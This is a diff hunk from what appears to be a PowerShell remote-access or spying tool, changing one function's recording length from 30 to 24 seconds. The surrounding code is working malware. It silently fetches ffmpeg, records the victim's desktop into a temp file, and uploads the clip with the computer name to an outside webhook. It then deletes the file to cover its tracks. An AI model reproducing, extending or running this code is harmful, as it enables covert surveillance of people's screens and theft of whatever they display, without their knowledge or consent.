@@ -917,12 +917,12 @@ param ([int[]]$t)
     If (!(Test-Path $Path)){  
         GetFfmpeg
     }
-    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t 30 seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t 24 seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
     Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
     
     $mkvPath = "$env:Temp\ScreenClip.mkv"
-    if ($t.Length -eq 0){$t = 30}
-    .$env:Temp\ffmpeg.exe -f gdigrab -t 30 -framerate 25 -i desktop $mkvPath
+    if ($t.Length -eq 0){$t = 24}
+    .$env:Temp\ffmpeg.exe -f gdigrab -t 24 -framerate 25 -i desktop $mkvPath
     curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
     sleep 5
     rm -Path $mkvPath -Force
